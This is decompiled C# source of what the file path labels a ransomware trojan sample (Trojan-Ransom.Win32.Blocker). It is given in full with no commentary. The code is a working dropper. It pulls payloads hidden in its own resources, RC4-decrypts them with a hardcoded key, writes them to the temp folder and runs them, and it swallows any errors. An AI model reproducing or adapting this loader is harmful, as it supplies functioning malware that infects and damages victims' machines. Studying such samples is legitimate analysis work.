// Decompiled with JetBrains decompiler
// Type: data.d
// Assembly: data, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0FFD61CB-C418-4293-A923-74648DC1BC7F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.fars-47c04a44acbac06b482e197d6a361d27f3917292.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace data
{
  public class d
  {
    [DebuggerNonUserCode]
    public d()
    {
    }

    [DllImport("kernel32", EntryPoint = "FindResourceA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr FindResource(IntPtr hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name, IntPtr type);

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

    public static byte[] RC4EnDeCrypt(byte[] plaintxt, byte[] password)
    {
      byte[] numArray = new byte[checked (plaintxt.Length + 1)];
      int[] sbox = new int[257];
      int index1 = 0;
      int index2 = 0;
      d.RC4Initialize(password, ref sbox);
      int num1 = checked (plaintxt.Length - 1);
      int index3 = 0;
      while (index3 <= num1)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + sbox[index1]) % 256;
        int num2 = sbox[index1];
        sbox[index1] = sbox[index2];
        sbox[index2] = num2;
        int num3 = sbox[checked (sbox[index1] + sbox[index2]) % 256];
        plaintxt[index3] = (byte) ((int) plaintxt[index3] ^ (int) Convert.ToByte(num3));
        checked { ++index3; }
      }
      return plaintxt;
    }

    protected static void RC4Initialize(byte[] key, ref int[] sbox)
    {
      int length = key.Length;
      int index1 = 0;
      do
      {
        sbox[index1] = index1;
        checked { ++index1; }
      }
      while (index1 <= (int) byte.MaxValue);
      int index2 = 0;
      int index3 = 0;
      do
      {
        index2 = checked (index2 + sbox[index3] + (int) key[unchecked (index3 % length)]) % 256;
        int num = sbox[index3];
        sbox[index3] = sbox[index2];
        sbox[index2] = num;
        checked { ++index3; }
      }
      while (index3 <= (int) byte.MaxValue);
    }

    [STAThread]
    public static void Main()
    {
      try
      {
        string[] strArray = d.ConvertFromBase64(new string(Encoding.ASCII.GetChars(d.ReadMyself("payload0")))).Split('\r');
        int integer = Conversions.ToInteger(strArray[0]);
        int index = 1;
        while (index <= integer)
        {
          string str = Path.GetTempPath() + strArray[index].Trim();
          File.WriteAllBytes(str, d.RC4EnDeCrypt(d.ReadMyself("payload" + Conversions.ToString(index)), Encoding.ASCII.GetBytes("72389")));
          Process.Start(str);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static byte[] ReadMyself(string ResName)
    {
      IntPtr type = new IntPtr(10);
      string moduleName = Process.GetCurrentProcess().MainModule.ModuleName;
      IntPtr moduleHandle = d.GetModuleHandle(ref moduleName);
      IntPtr resource = d.FindResource(moduleHandle, ref ResName, type);
      int num = d.SizeofResource(moduleHandle, resource);
      IntPtr source = d.LoadResource(moduleHandle, resource);
      byte[] destination = new byte[checked (num - 1 + 1)];
      Marshal.Copy(source, destination, 0, destination.Length);
      return destination;
    }

    public static string ConvertFromBase64(string input) => new string(Encoding.ASCII.GetChars(Convert.FromBase64String(input)));
  }
}
